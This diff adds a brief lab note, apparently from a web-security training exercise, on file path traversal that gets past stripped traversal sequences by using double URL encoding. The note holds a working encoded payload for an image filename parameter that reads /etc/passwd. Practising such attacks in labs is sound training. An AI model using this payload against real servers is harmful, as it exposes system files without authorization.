@@ -1,0 +1,6 @@
+Lab #4 - File path traversal, traversal sequences stripped with superfluous URL-decode
+
+Target Goal:-  Retrieve the contents of the /etc/passwd file. 
+
+Analysis:-
+/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564
